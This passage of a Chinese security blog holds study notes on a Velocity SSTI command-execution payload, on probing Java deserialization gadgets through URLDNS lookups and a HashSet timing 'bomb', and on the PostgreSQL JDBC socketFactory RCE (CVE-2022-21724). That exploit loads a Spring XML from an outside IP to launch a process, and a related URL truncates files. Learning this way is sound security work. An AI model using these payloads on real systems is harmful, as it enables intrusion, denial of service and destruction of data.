<p>在遍历到第三个节点的时候，跟进去，首先经过一系列判断，走到<code>this.execute</code>方法处，即<code>ASTMethod#execute</code>，这里继续调用子节点树节点的<code>execute</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753893010101-f1462f5e-cf79-4079-999d-fd39b7dd177c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753893010101-f1462f5e-cf79-4079-999d-fd39b7dd177c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>继续进入，就到了<code>method.invoke</code>执行反射方法调用的地方，将执行的返回的obj返回，作为下一个调用下一个方法的对象</p>
<p>应该到这里就能理解了，先执行<code>&#39;e&#39;.getClass</code>，返回<code>java.lang.String</code>，再调用<code>java.lang.String</code>的<code>forName(&quot;java.lang.Runtime&quot;)</code>，以此类推……</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753893133365-c2d066d2-092b-4702-a86a-09ba50d23e27.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753893133365-c2d066d2-092b-4702-a86a-09ba50d23e27.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>mergr方法触发的流程和这个差不多，就不再具体分析了，有兴趣的可以自己去看看</p>
<h4 id="hJg8A">有回显的Payload</h4>

<p>我们知道其实该SSTI最后达到的效果就是任意代码执行，最后被渲染的地方会被替换为 代码所返回的值，那么我们就可以构造有回显的payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#set($x=<span class="string">&#x27;&#x27;</span>)+#set($rt=$x.class.forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>))+#set($chr=$x.class.forName(<span class="string">&#x27;java.lang.Character&#x27;</span>))+#set($str=$x.class.forName(<span class="string">&#x27;java.lang.String&#x27;</span>))+#set($ex=$rt.getRuntime().exec(<span class="string">&#x27;id&#x27;</span>))+$ex.waitFor()+#set($out=$ex.getInputStream())+#foreach($i+in+[<span class="number">1.</span>.$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">rt = java.lang.Runtime.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">chr</span> = java.lang.<span class="type">String</span></span><br><span class="line"><span class="variable">ex</span> <span class="operator">=</span> java.lang.Runtime.getRuntime().exec(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">ex.waitFor()</span><br><span class="line"><span class="comment">// 循环读取输出</span></span><br></pre></td></tr></table></figure>

<h2 id="K6KNY">小结</h2>

<p>感觉确实比较难，学习SSTI的同时，也将Spring一些底层部分简单学习了一下，也算是为后面Spring内存马的学习做一些简单的铺垫吧</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化Gadget探测</title>
    <url>/2025/07/30/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadget%E6%8E%A2%E6%B5%8B/</url>
    <content><![CDATA[<h1 id="Zp5LF">Java反序列化Gadget探测</h1>
<h2 id="oLVmo">前言</h2>

<p>之前面试的时候，有问过我：”在黑盒测试中，找到一个反序列化过程的点，你该怎么找可用的Gadget“，当时不太清楚有这种方式，回答所有gadget都爆破一下……今天来看一下如何用URLDNS链探测可用Gadget</p>
<h2 id="e7JR0">背景</h2>

<p>虽然将所有的gadget都测试一遍的方法也是可行的，但是单纯的盲测工作量会非常巨大，而且也无法确定由于什么原因导致的无法RCE。</p>
<p>原因包括但不限于以下这些：</p>
<ol>
<li>无导入gadget依赖的jar包</li>
<li>suid不一致</li>
<li>导入jar包为不存在漏洞的版本</li>
<li>gadget使用的class类进入了黑名单</li>
</ol>
<h2 id="pbnyc">构造Java类探测反序列化gadget</h2>

<p>如果构造一个Java类来探测反序列化Gadget，那么我们就需要考虑它的通用性。因此这个类最好是JDK中自带的类，并且这个</p>
<h3 id="Kpmoq">解决serialVersionUID问题</h3>

<p>我们之前有了解过<code>serialVersionUID</code>，**Java的序列化机制是通过判断运行时类的serialVersionUID来验证版本一致性的，**在Java原生反序列化时会检测<code>serialVersionUID</code>。当我们在本地构造的序列化Class和服务器上Class SUID不同时，就算服务器上真实存在这个类，我们也无法成功反序列化。</p>
<p>对于<code>serialVersionUID</code>的检测在该方法中<code>ObjectStreamClass#initNonProxy</code>，检测代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">initNonProxy</span><span class="params">(ObjectStreamClass model,</span></span><br><span class="line"><span class="params">                      Class&lt;?&gt; cl,</span></span><br><span class="line"><span class="params">                      ClassNotFoundException resolveEx,</span></span><br><span class="line"><span class="params">                      ObjectStreamClass superDesc)</span></span><br><span class="line"><span class="keyword">throws</span> InvalidClassException&#123;</span><br><span class="line">    <span class="comment">// model是基于序列化数据构造的ObjectStreamClass对象</span></span><br><span class="line">    suid = Long.valueOf(model.getSerialVersionUID());</span><br><span class="line">    serializable = model.serializable;</span><br><span class="line">    externalizable = model.externalizable;</span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 通过类名，基于当前运行环境构造的ObjectStreamClass</span></span><br><span class="line">        localDesc = lookup(cl, <span class="literal">true</span>);</span><br><span class="line">        ......</span><br><span class="line">        <span class="comment">// SUID检查条件：是否都或都没有实现了Serializable接口 &amp;&amp; 不是数组类 &amp;&amp; suid不相同</span></span><br><span class="line">        <span class="keyword">if</span> (serializable == localDesc.serializable &amp;&amp;</span><br><span class="line">            !cl.isArray() &amp;&amp;</span><br><span class="line">            suid.longValue() != localDesc.getSerialVersionUID())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(localDesc.name,</span><br><span class="line">                <span class="string">&quot;local class incompatible: &quot;</span> +</span><br><span class="line">                <span class="string">&quot;stream classdesc serialVersionUID = &quot;</span> + suid +</span><br><span class="line">                <span class="string">&quot;, local class serialVersionUID = &quot;</span> +</span><br><span class="line">                localDesc.getSerialVersionUID());</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于SUID的检测中，有三个条件：继承<code>Serializable</code>接口的情况是否一致、不是数组、SUID不相同。想绕过SUID的检测，只需要让前面的两个条件不成立即可。</p>
<p>假设在我们想要探测A类是否存在时，有以下两种方法可用：</p>
<ol>
<li>通过<code>javassist</code>动态生成一个A类，但是不实现<code>Serializable</code>接口。当服务器上的A类存在，并且继承<code>Serializable</code>接口时，那么第一个条件<code>serializable == localDesc.serializable</code>就不成立，即可绕过SUID检测；当服务器上A类存在，但是并没有继承<code>Serializable</code>接口时，那么两个类的SUID都为0，那么第三个条件就不符合。</li>
<li>直接序列化A类数组<code>A[].class</code>，第二个条件直接不符合，就不需要考虑是否都继承或不继承<code>Serializable</code>接口和SUID是否相同</li>
</ol>
<h4 id="Wbclq">方法一</h4>

<p>下面是通过javassist来动态生成Class的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class <span class="title function_">makeClass</span><span class="params">(String clazzName)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(clazzName);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> ctClass.toClass();</span><br><span class="line">    ctClass.defrost();</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="qOSQA">方法二</h4>

<p>对于第二个条件，可以直接序列化<code>A[].class</code>进行绕过</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">A[].class</span><br></pre></td></tr></table></figure>

<h3 id="NmMM7">一次的失败的构造</h3>

<p>在看c0n1y师傅的文章时，在构造探测类时使用《包裹大量脏数据绕过WAF的思路》来构造，使用的是<code>LinkedList</code>。</p>
<p>但在测试过程中发现，在反序列化<code>LinkedList</code>第一个元素失败时，并不会导致反序列化的流程停止。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Object&gt;();</span><br><span class="line">list.add(makeClass(<span class="string">&quot;TargetClass&quot;</span>));</span><br><span class="line">list.add(<span class="keyword">new</span> <span class="title class_">URLDNS</span>.getObject(<span class="string">&quot;http://xxx.dnslog.cn&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>我们可以看到<code>ObjectInputStream#readObject</code>的方法内，有try catch的包裹，因此<code>ClassNotFoundException</code>并不能阻断反序列化<code>ObjectInputStream#readObject</code>的内部流程，但是可以阻断其他可序列化类的<code>readObject</code>流程。</p>
<p>就是说我们需要让<code>ClassNotFoundException</code>异常来阻断source到sink之间的通路</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753337954832-df9dd31a-3c39-4133-9861-031038056e79.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753337954832-df9dd31a-3c39-4133-9861-031038056e79.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="hvCGx">通过DNSLOG探测Class</h3>

<p>最后发现，可以在<code>HashMap#readObject</code>处进行阻断。</p>
<p>在反序列化key-value时，如果在value反序列化时，若没有该类，抛出<code>ClassNotFound</code>异常时，那么就会退出for循环，就不能到达<code>putVal</code>方法内，也就无法触发DNS请求。反之，就可以到达<code>putVal</code>方法从而触发DNS请求，达到探测gadget的目的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;mappings; i++) &#123;</span><br><span class="line">      <span class="comment">// 序列化要探测的Class</span></span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">        <span class="comment">// 反序列化URL对象</span></span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">         putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后学习一下怎么构造，脚本如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeClass</span><span class="params">(String className)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(className);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> ctClass.toClass();</span><br><span class="line">        ctClass.defrost();</span><br><span class="line">        <span class="keyword">return</span> aClass;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String commond)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] cmds = commond.split(<span class="string">&quot;\\|&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cmds.length != <span class="number">2</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;&lt;url&gt; | &lt;class name&gt;&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> cmds[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> cmds[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">        setFieldValue(u,<span class="string">&quot;hashCode&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        hashMap.put(u,makeClass(className));</span><br><span class="line"></span><br><span class="line">        setFieldValue(u,<span class="string">&quot;hashCode&quot;</span>,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//        HashMap map = (HashMap) getObject(&quot;http://gkoqfayloq.lfcx.eu.org|Sean&quot;);</span></span><br><span class="line"><span class="comment">//        serialize(map);</span></span><br><span class="line">        deserialize();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="uF31K">反序列化炸弹探测gadget</h2>

<p>在有些情况下，目标可能并不出网或者没有配置DNS服务，就无法通过DNS来探测</p>
<p>c0ny1师傅的文章中写到了这种：通过构造特殊的多层签到HashSet，导致服务器反序列化的时间复杂度提升，消耗服务器部分性能到达延时的作用来探测Class。（上次见类似的方式还是在SQL的延时注入中）</p>
<p>实际这个脚本是没太看明白的，不知道怎么构造的反序列化炸弹（师傅们大学好好学数据结构什么的，要不然时间复杂度什么的都搞不明白），直接借来c0ny1师傅的脚本看一下吧</p>
<blockquote>
<p>由于每个服务器的性能不一样，要想让它们延时时间相同，就需要调整反序列化炸弹的深度。所以在使用该gadget时，要先测试出深度，一般最好调整到比正常请求慢10秒以上。经过我的实战一般这个深度都在25到28之间，切记不要设置太大否则造成DOS。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Authors(&#123; Authors.C0NY1 &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FindClassByBomb</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">int</span> depth;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(command.contains(<span class="string">&quot;|&quot;</span>))&#123;</span><br><span class="line">            String[] x = command.split(<span class="string">&quot;\\|&quot;</span>);</span><br><span class="line">            className = x[<span class="number">0</span>];</span><br><span class="line">            depth = Integer.valueOf(x[<span class="number">1</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            className = command;</span><br><span class="line">            depth = <span class="number">28</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">findClazz</span> <span class="operator">=</span> makeClass(className);</span><br><span class="line">        Set&lt;Object&gt; root = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">        Set&lt;Object&gt; s1 = root;</span><br><span class="line">        Set&lt;Object&gt; s2 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; depth; i++) &#123;</span><br><span class="line">            Set&lt;Object&gt; t1 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">            Set&lt;Object&gt; t2 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">            t1.add(findClazz);</span><br><span class="line"></span><br><span class="line">            s1.add(t1);</span><br><span class="line">            s1.add(t2);</span><br><span class="line"></span><br><span class="line">            s2.add(t1);</span><br><span class="line">            s2.add(t2);</span><br><span class="line">            s1 = t1;</span><br><span class="line">            s2 = t2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>当探测类存在时，就会达到延时的效果，如果所探测的类不存在，那么就不会延时。</p>
<h2 id="oqDka">CheckList</h2>

<p>如果在实战中使用的话，那么就需要有class的checklist备用。如果维护好一个不错的CheckList，可以判断很多东西：</p>
<p>工具的话可以看c0ny1师傅的ysoserial-for-woodpecker：<a href="https://github.com/woodpecker-framework/ysoserial-for-woodpecker">https://github.com/woodpecker-framework/ysoserial-for-woodpecker</a></p>
<ol>
<li>OracleJdk or OpenJdk</li>
<li>JRE or JDK</li>
<li>中间件的类型（辅助构造回显与内存马）</li>
<li>使用的Web框架</li>
<li>BCEL ClassLoader是否存在</li>
<li>判断Java版本</li>
<li>……</li>
</ol>
<h2 id="ysuRF">参考文章</h2>

<p>构造java探测class反序列化gadget：<a href="https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA?poc_token=HOvegWijiXqVnyqFXJ3yo0NnScMLyq8qAGJ0_0HR">https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA?poc_token&#x3D;HOvegWijiXqVnyqFXJ3yo0NnScMLyq8qAGJ0_0HR</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Gedget探测</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL-JDBC-Attack</title>
    <url>/2025/08/07/PostgreSQL-JDBC-Attack/</url>
    <content><![CDATA[<h1 id="HDMcM">PostgreSQL-JDBC-Attack</h1>
<h2 id="FdnpK">前言</h2>
之前学习过通过Mysql驱动进行JDBC反序列化，最近有听到JDBC不出网的利用方式，今天来学习一下

<h2 id="NS9IA">PostgreSQL-JDBC RCE</h2>
<h3 id="aPut1">PostgreSQL Diver出网利用</h3>
<h4 id="kB94K">影响版本</h4>

<p>受影响版本如下：</p>
<ul>
<li>&lt; 42.2.25</li>
<li>&gt;&#x3D; 42.3.0，&lt; 42.3.2</li>
</ul>
<h4 id="K49ou">漏洞环境</h4>

<p>首先在本地构造一个触发漏洞的环境，在pom.xml中导入PostgreSQL依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.postgresql/postgresql --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.postgresql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>postgresql<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>42.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context-support<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>将以下内容写入poc.xml文件中，并通过<code>python -m http.server 80</code>开启一个http服务</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">&quot;calc.exe&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;whatever&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;test.start()&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造以下漏洞验证代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cve_2022_21724</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[]args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryClass</span> <span class="operator">=</span> <span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryArg</span> <span class="operator">=</span> <span class="string">&quot;http://101.36.122.13/poc.png&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dbUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql://127.0.0.1:5432/?socketFactory=&quot;</span>+socketFactoryClass+<span class="string">&quot;&amp;socketFactoryArg=&quot;</span>+socketFactoryArg;</span><br><span class="line">        System.out.println(dbUrl);</span><br><span class="line">        DriverManager.getConnection(dbUrl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时可以使用如下Poc，可以将文件置空</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jdbc:postgresql:<span class="comment">//127.0.0.1:5432/test/?socketFactory=java.io.FileOutputStream&amp;socketFactoryArg=test.txt</span></span><br></pre></td></tr></table></figure>

<h4 id="ti04E">漏洞分析</h4>

<p>在<code>DiverManager.getConnection(dbUrl)</code>处打一个断点，跟入</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752717492031-ea4da014-ca1b-44ee-a486-8d851a7ea585.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752717492031-ea4da014-ca1b-44ee-a486-8d851a7ea585.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>判断出使用<code>postgresql</code>的JDBC驱动进行连接</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752717670986-4dae398e-4241-4d4e-8be4-bd5e6f32b097.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752717670986-4dae398e-4241-4d4e-8be4-bd5e6f32b097.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>parseURL会从url中将参数解析出来（里面的逻辑这里不看了，师傅们可以自己去看一下），并调用<code>makeConnection</code>开始连接数据库</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718092484-ad97875f-07ab-48c7-beef-520adaef1409.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718092484-ad97875f-07ab-48c7-beef-520adaef1409.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>PgConnection</code>的构造方法中，这里调用<code>ConnectionFactory#openConnection</code>，将连接数据库所需要的参数传入</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718339310-ac9f14ec-7e46-47f6-9772-fa125ee85453.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718339310-ac9f14ec-7e46-47f6-9772-fa125ee85453.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进到<code>ConnectionFactoryImpl#openConnectionImpl</code>方法中，因为我们的可控都在info中，因此我们只需要跟着info走就行</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718566440-1e03af9f-f2eb-44c0-8c27-1d119990b8eb.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718566440-1e03af9f-f2eb-44c0-8c27-1d119990b8eb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>再次跟进到<code>SocketFactoryFactory.getSocketFactory(info)</code>方法中，这里get到了<code>socketFactoryClassName</code>和<code>socketFactoryArg</code>，并传入<code>instantiate</code>方法中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718857538-90c7558e-cffb-40f6-b273-60961c79956e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752718857538-90c7558e-cffb-40f6-b273-60961c79956e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在<code>ObjectFactory#instantiate</code>中，实际是通过反射调用去构造一个<code>ClassPathXmlApplicationContext</code>类</p>
